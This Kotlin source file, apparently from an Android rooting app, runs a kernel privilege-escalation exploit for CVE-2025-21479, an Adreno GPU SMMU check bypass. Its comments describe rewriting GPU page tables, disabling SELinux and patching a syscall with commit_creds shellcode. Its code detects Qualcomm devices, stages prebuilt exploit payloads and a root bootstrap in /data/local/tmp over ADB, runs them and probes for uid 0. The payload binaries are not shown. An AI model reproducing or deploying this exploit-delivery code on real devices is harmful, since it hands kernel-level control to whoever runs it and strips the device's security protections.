package com.hexo141.liquidglass.root

import android.content.Context
import com.hexo141.liquidglass.adb.AbsAdbConnectionManager
import com.hexo141.liquidglass.adb.AdbShell
import com.hexo141.liquidglass.device.DeviceInfo
import java.io.File

/**
 * Third engine: CVE-2025-21479, the Adreno A7xx `CP_SMMU_TABLE_UPDATE` check bypass.
 *
 * The GPU firmware masks the current instruction-buffer level with `0x3` before deciding
 * whether a command runs in the privileged kernel ring buffer. A7xx sets the level to `0x4`
 * for self-draw-state packets, so `0x4 and 0x3` looks like the kernel ring buffer and the
 * SMMU page tables can be rewritten from a normal app context. The payloads build a physical
 * read/write primitive out of that, disable SELinux, patch `__do_sys_capset` with a
 * `commit_creds(init_cred)` shellcode, then re-exec the command they were given as uid 0.
 *
 * Two builds ship because the physical layout is device specific:
 * - [Payload.QUEST] is zhuowei/cheese (Meta Quest 3 / 3S, XR2 Gen 2).
 * - [Payload.SNAPDRAGON] is the iqooneo8 port (Snapdragon 8 Gen 1 / 8+ Gen 1, SM8475).
 *
 * There is no way to tell a patched Adreno from a vulnerable one without running the exploit,
 * so the status starts as "Untested" whenever a Qualcomm GPU is detected; the first run is
 * recorded in [ExploitMemory] and the status follows that result afterwards.
 *
 * The root the payload gets is scoped to the process it spawns, so the runner hands it the
 * `bootstrap` staged next to the payload. That either late-loads the manager's `ksud` or keeps
 * a root command channel alive, exactly like the page-cache engine.
 */
object GpuRunner {
    private const val STAGE_DIR = "/data/local/tmp/openroot"
    private const val BOOTSTRAP = "libopenbootstrap.so"
    private const val BOOTSTRAP_REMOTE = "loader"

    /** Builds whose physical layout differs enough to need a separate payload. */
    enum class Payload(val asset: String, internal val questFamily: Boolean) {
        QUEST("libcheese-quest.so", true),
        SNAPDRAGON("libcheese-snapdragon.so", false),
    }

    /** Outcome of one run. */
    data class Result(val exitCode: Int, val handoff: RootHandoff.Result)

    /** `ro.soc.model` on Qualcomm is the part number, e.g. SM8475, SM8650, XR2. */
    private val QUALCOMM_PART = Regex("""\b(?:SM|XR)\d{3,4}\b""", RegexOption.IGNORE_CASE)

    /** Strings that identify the headset branch of the port rather than a phone. */
    private val QUEST_MARKERS = listOf("quest", "oculus", "meta", "xr2")

    /** Whether the build for [payload] got packaged for this ABI. */
    fun isPayloadPresent(context: Context, payload: Payload): Boolean =
        File(context.applicationInfo.nativeLibraryDir, payload.asset).isFile

    /**
     * Snapdragon / Adreno detection. `gpu_model` is the strongest signal, but some builds hide
     * the KGSL sysfs node, so the SoC props and `ro.hardware.egl` are checked as well.
     */
    fun isSupported(info: DeviceInfo): Boolean {
        val gpu = info.gpu.lowercase()
        val chip = info.chipset.lowercase()
        return gpu.contains("adreno") ||
            gpu.contains("kgsl") ||
            chip.contains("adreno") ||
            chip.contains("snapdragon") ||
            chip.contains("qualcomm") ||
            chip.contains("qti") ||
            QUALCOMM_PART.containsMatchIn(info.chipset)
    }

    /**
     * Picks the build for the connected device, so the picker only ever lists the CVE.
     *
     * The two builds differ in physical addresses, not in the bug, so the choice is made from the
     * device itself: a headset reports XR2 / Oculus / Quest, everything else on an Adreno GPU gets
     * the phone build.
     */
    fun payloadFor(info: DeviceInfo): Payload? {
        if (!isSupported(info)) return null
        val identity = listOf(info.deviceName, info.chipset, info.gpu)
        val quest = identity.any { field ->
            QUEST_MARKERS.any { marker -> field.contains(marker, ignoreCase = true) }
        }
        return if (quest) Payload.QUEST else Payload.SNAPDRAGON
    }

    /** Engine name for the status card, or {@code null} when this is not a Qualcomm GPU. */
    fun describe(info: DeviceInfo): String? =
        if (isSupported(info)) "CVE-2025-21479" else null

    /**
     * Pushes one payload plus the root handoff and runs it as the `shell` user.
     *
     * @param suManager manager whose `libksud.so` is staged; when {@code null} the payload
     *        starts a root command channel instead
     */
    @Throws(Exception::class)
    fun run(
        context: Context,
        manager: AbsAdbConnectionManager,
        payload: Payload,
        suManager: KsuManager.Target?,
        onLine: (String) -> Unit,
        onProgress: (Float) -> Unit = {},
    ): Result {
        val payloadFile = File(context.applicationInfo.nativeLibraryDir, payload.asset)
        require(payloadFile.isFile) {
            "Payload is not packaged for this ABI (${payloadFile.absolutePath})"
        }
        val bootstrap = File(context.applicationInfo.nativeLibraryDir, BOOTSTRAP)
        require(bootstrap.isFile) { "bootstrap is not packaged for this ABI" }

        onProgress(0.06f)
        onLine("$ mkdir -p $STAGE_DIR")
        AdbShell.exec(manager, "mkdir -p $STAGE_DIR")

        // Everything goes through AdbShell.stage: it drops the bytes in this app's external cache
        // first, so the shell only has to copy a file it can already read. Feeding `cat` over stdin
        // looked fine in the log but every staged file landed as 0 bytes on the Shizuku transport.
        val relayDir = context.getExternalCacheDir()

        AdbShell.stage(
            manager,
            "$STAGE_DIR/${payload.asset}",
            payloadFile.readBytes(),
            relayDir,
            "stage-payload.bin",
            onLine,
        )
        onProgress(0.2f)
        onLine("$ chmod 755 $STAGE_DIR/${payload.asset}")
        AdbShell.exec(manager, "chmod 755 $STAGE_DIR/${payload.asset}")

        // The exploit re-execs this path as uid 0 once __do_sys_capset is restored.
        AdbShell.stage(
            manager,
            "$STAGE_DIR/$BOOTSTRAP_REMOTE",
            bootstrap.readBytes(),
            relayDir,
            "stage-bootstrap.bin",
            onLine,
        )
        onProgress(0.3f)
        onLine("$ chmod 755 $STAGE_DIR/$BOOTSTRAP_REMOTE")
        AdbShell.exec(manager, "chmod 755 $STAGE_DIR/$BOOTSTRAP_REMOTE")

        // Same preference contract the page-cache engine uses; "none" selects the root channel.
        val managerValue = suManager?.packageName.orEmpty().ifEmpty { "none" }
        val prefs = """
            <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
            <map>
                <string name="su_manager">$managerValue</string>
                <boolean name="soft_reboot" value="false" />
                <boolean name="disable_modules" value="false" />
            </map>
        """.trimIndent().toByteArray()
        AdbShell.stage(
            manager,
            "$STAGE_DIR/openroot.xml",
            prefs,
            relayDir,
            "stage-prefs.xml",
            onLine,
        )
        onProgress(0.38f)
        AdbShell.exec(manager, "chmod 644 $STAGE_DIR/openroot.xml")

        if (suManager != null) {
            // Two ways to get ksud on the device: keep one an earlier run already staged, or read
            // the manager's library from this app and let the shell copy the relay file. A `dd` of
            // the manager's private lib dir cannot work - the shell user cannot open that path.
            val alreadyStaged = AdbShell.exec(
                manager,
                "test -s $STAGE_DIR/ksud && test -x $STAGE_DIR/ksud && echo ok",
            ).contains("ok")

            if (alreadyStaged) {
                onLine("$ test -x $STAGE_DIR/ksud    # already staged, skipping")
                onProgress(0.46f)
            } else {
                val ksudBytes = KsuManager.readKsud(suManager.ksudPath)
                if (ksudBytes == null) {
                    onLine("<e> cannot read ${suManager.ksudPath} from this app")
                    throw IllegalStateException("Cannot stage ksud (${suManager.ksudPath})")
                }
                AdbShell.stage(
                    manager,
                    "$STAGE_DIR/ksud",
                    ksudBytes,
                    relayDir,
                    "stage-ksud.bin",
                    onLine,
                )
                onLine("$ chmod 755 $STAGE_DIR/ksud")
                AdbShell.exec(manager, "chmod 755 $STAGE_DIR/ksud")
                onProgress(0.46f)

                val staged = AdbShell.exec(
                    manager,
                    "test -s $STAGE_DIR/ksud && test -x $STAGE_DIR/ksud && echo ok",
                ).contains("ok")
                if (!staged) {
                    onLine(stageDiagnostics(manager, suManager))
                    throw IllegalStateException("Cannot stage ksud (${suManager.ksudPath})")
                }
            }
        }

        onProgress(0.5f)
        onLine("$ cd $STAGE_DIR && ./${payload.asset} $STAGE_DIR/$BOOTSTRAP_REMOTE")
        // The payload copies a kernel image and prints progress while it does, so the idle
        // watchdog has to survive a long silent GPU read.
        val exitCode = AdbShell.stream(
            manager,
            "cd $STAGE_DIR && TMPDIR=$STAGE_DIR HOME=$STAGE_DIR " +
                "./${payload.asset} $STAGE_DIR/$BOOTSTRAP_REMOTE 2>&1",
            onLine,
            idleTimeoutMs = 240_000,
        )
        onProgress(0.9f)

        // What bootstrap actually started, from the /dev markers it leaves behind.
        val handoff = RootHandoff.probe(manager, onLine, waitMs = 20_000)
        onProgress(1f)
        return Result(exitCode, handoff)
    }

    /**
     * A one-shot report on why the staged binary cannot be run, so the log says something more
     * useful than "cannot stage ksud".
     */
    private fun stageDiagnostics(
        manager: AbsAdbConnectionManager,
        suManager: KsuManager.Target,
    ): String {
        val report = StringBuilder("<e> staging failed, diagnostics:")
        val commands = listOf(
            "ls -l $STAGE_DIR/ksud",
            "ls -ld $STAGE_DIR",
            "id",
            "which cp cat chmod sh",
        )
        for (command in commands) {
            val result = runCatching { AdbShell.exec(manager, "$command 2>&1") }
                .getOrElse { error -> "<e> $command: ${error.message}" }
            report.append('\n').append("$ ").append(command)
            report.append('\n').append(result.trim().ifEmpty { "(no output)" })
        }
        report.append('\n').append("<e> source was ")
            .append(suManager.ksudPath)
        return report.toString()
    }
}
